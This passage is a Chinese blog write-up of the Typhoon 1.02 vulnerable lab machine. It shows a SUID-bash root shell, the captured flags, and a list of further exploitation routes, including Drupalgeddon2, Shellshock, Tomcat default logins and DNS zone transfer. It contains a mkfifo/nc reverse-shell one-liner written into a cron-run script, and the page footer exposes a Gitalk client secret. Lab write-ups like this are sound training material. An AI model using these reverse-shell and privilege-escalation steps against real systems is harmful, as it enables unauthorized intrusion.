+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">typhoon@typhoon:/tmp$ ./bash -p<br>bash-4.3<span class="hljs-comment"># whoami</span><br>root<br>bash-4.3<span class="hljs-comment"># id</span><br>uid=1000(typhoon) gid=1000(typhoon) euid=0(root) egid=0(root) <span class="hljs-built_in">groups</span>=0(root),4(adm),24(cdrom),30(dip),46(plugdev),110(lpadmin),112(sambashare),125(libvirtd),1000(typhoon)<br>bash-4.3<span class="hljs-comment"># ip a</span><br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default <br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:2d:c0:8f brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.121/24 brd 192.168.56.255 scope global eth0<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::a00:27ff:fe2d:c08f/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>3: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default <br>    <span class="hljs-built_in">link</span>/ether 02:42:bc:90:00:31 brd ff:ff:ff:ff:ff:ff<br>    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0<br>       valid_lft forever preferred_lft forever<br>4: virbr0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default <br>    <span class="hljs-built_in">link</span>/ether 8e:16:41:6c:32:c8 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.122.1/24 brd 192.168.122.255 scope global virbr0<br>       valid_lft forever preferred_lft forever<br>bash-4.3<span class="hljs-comment"># uname -a</span><br>Linux typhoon.local 3.13.0-32-generic <span class="hljs-comment">#57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</span><br>bash-4.3<span class="hljs-comment"># cd /root</span><br>bash-4.3<span class="hljs-comment"># ls</span><br>root-flag<br>bash-4.3<span class="hljs-comment"># cat root-flag </span><br>&lt;Congrats!&gt;<br><br>Typhoon_r00t3r!<br><br>&lt;/Congrats!&gt;<br></code></pre></td></tr></table></figure>
+
+<p>不过这里有个疑问，实际上我第一次运行脚本的时候，得到的文件的属主是 typhoon，我甚至删去了&#x2F;tmp&#x2F;bash，但是最后又莫名奇妙多了个 root 属主的 bash 文件，比较疑惑，等回头重新导入下靶机，然后尝试复现一下，贴一下问题记录</p>
+<p><img src="/pic/8bf6be7d70f75490908c417147aa396c_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>文件的修改时间只相差了 3 min</p>
+<p><img src="/pic/edb6435c1a143cde328c1f1bc80b1a06_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-4.3<span class="hljs-comment"># ls -liah bash</span><br>667555 -rwsr-sr-x 1 root root 994K Jul  2 20:33 bash<br>bash-4.3<span class="hljs-comment"># stat bash</span><br>  File: ‘bash’<br>  Size: 1017016         Blocks: 1992       IO Block: 4096   regular file<br>Device: fc00h/64512d    Inode: 667555      Links: 1<br>Access: (6755/-rwsr-sr-x)  Uid: (    0/    root)   Gid: (    0/    root)<br>Access: 2023-07-02 21:09:27.916683000 +0300<br>Modify: 2023-07-02 20:33:01.148683000 +0300<br>Change: 2023-07-02 20:33:01.152683000 +0300<br> Birth: -<br></code></pre></td></tr></table></figure>
+
+<p>看不到文件的创建时间，猜测这个脚本可能是被定时执行了。还可以反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.27.187 8888 &gt;/tmp/f&quot;</span> &gt; script.sh<br>nc -vlp 8888<br></code></pre></td></tr></table></figure>
+
+<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><ul>
+<li><a target="_blank" rel="noopener" href="http://www.infosecworld.cn/index.php?m=content&c=index&a=show&catid=48&id=2583">红队渗透测试之Typhoon——通过十种不同方法拿下 - 网络攻防 - 网信安全世界-中国网信安全领域技术交流和知识分享平台 (infosecworld.cn)</a></li>
+</ul>
+<p>我尝试了 drupal_drupalgeddon2，使用 msf 可以直接 getshell。以下是文章中提到的我没有尝试过的方法</p>
+<ul>
+<li>OpenSSH 2.3 &lt; 7.7 - Username Enumeration 用户名枚举，然后使用 hydra 进行爆破</li>
+<li>phpmoadm 信息泄露</li>
+</ul>
+<p><img src="/pic/4afdd8ff3992c21cb9c5c890b730a8a4_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li><p>LotusCMS 漏洞利用：直接使用脚本利用失败，可能是靶机 nc 没有 -e 参数吧，不过文章里用 msf 成功了</p>
+</li>
+<li><p>Tomcat 漏洞利用：尝试使用默认账户登录 tomcat&#x2F;tomcat，登录成功，使用 tomcat_mgr_upload 漏洞</p>
+</li>
+<li><p>Shellshock 漏洞利用：nikto 漏洞扫描发现&#x2F;cgi-bin&#x2F;test.sh 存在 shellshock 漏洞</p>
+</li>
+<li><p>postgres_login 爆破，登录成功后进行文件读写来反弹 shell</p>
+</li>
+<li><p>linux 版永恒之蓝：Samba 3.5+ &lt;4.6.4 &lt;4.5.10 &lt;4.4.14 CVE-2017-7494</p>
+</li>
+<li><p>25 端口 DNS 域传送信息泄露：发现子域名，依次查看进而得到某个子域名下存在 WebCalendar v1.2.4 (08 Aug 2011)，存在漏洞</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/typhoon]<br>└─$ dig @192.168.56.122 -t axfr typhoon.local                       <br><br>DiG 9.18.13-1-Debian @192.168.56.122 -t axfr typhoon.local<br>; (1 server found)<br>;; global options: +cmd<br>typhoon.local.          3600    IN      SOA     ns.prismacsi.com. enes.prismacsi.com. 1 3600 600 86400 3600<br>typhoon.local.          3600    IN      NS      ns1.typhoon.local.<br>typhoon.local.          3600    IN      NS      ns2.typhoon.local.<br>calendar.typhoon.local. 3600    IN      CNAME   wwww.typhoon.local.<br>flag.typhoon.local.     3600    IN      TXT     <span class="hljs-string">&quot;g00d_j0b_typh00n!&quot;</span><br>ns1.typhoon.local.      3600    IN      A       192.168.1.5<br>ns2.typhoon.local.      3600    IN      A       192.168.1.6<br>prisma.typhoon.local.   3600    IN      A       192.168.1.8<br>secretmessage.typhoon.local. 3600 IN    TXT     <span class="hljs-string">&quot;prismacsi.com&quot;</span><br>www.typhoon.local.      3600    IN      A       192.168.1.7<br>typhoon.local.          3600    IN      SOA     ns.prismacsi.com. enes.prismacsi.com. 1 3600 600 86400 3600<br>;; Query time: 0 msec<br>;; SERVER: 192.168.56.122<span class="hljs-comment">#53(192.168.56.122) (TCP)</span><br>;; WHEN: Sun Jul 02 22:36:41 EDT 2023<br>;; XFR size: 11 records (messages 1, bytes 338)<br></code></pre></td></tr></table></figure>
+
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44519789/article/details/115295118">(1条消息) P5 利用Vulhub复现漏洞 -DNS域传送漏洞_53:dns服务端口(tcp&#x2F;udp 53)漏洞修复_在下小黄的博客-CSDN博客</a></p>
+</li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/knowledge-database/" class="category-chain-item">knowledge_database</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>TYPHOON_1_02 靶机</div>
+      <div>https://i3eg1nner.github.io/2023/07/3e56f363190c.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>I3eg1nner</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年7月2日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/07/57098f1aa06f.html" title="Bulldog_1 靶机">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Bulldog_1 靶机</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/07/7f83e81bb133.html" title="HTB打靶之 vultr上 kali Linux搭建">
+                        <span class="hidden-mobile">HTB打靶之 vultr上 kali Linux搭建</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://lib.baomitu.com/gitalk/1.8.0/gitalk.min.js', function() {
+        var options = Object.assign(
+          {"clientID":"a14e9a13405642f51885","clientSecret":"5662f466deab58fdbbacd0ae3718eaf1625401dd","repo":"gitalk","owner":"I3eg1nner","admin":["I3eg1nner"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
+          {
+            id: 'd952f80b065e9656de330a012663cf67'
+          }
+        )
+        var gitalk = new Gitalk(options);
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
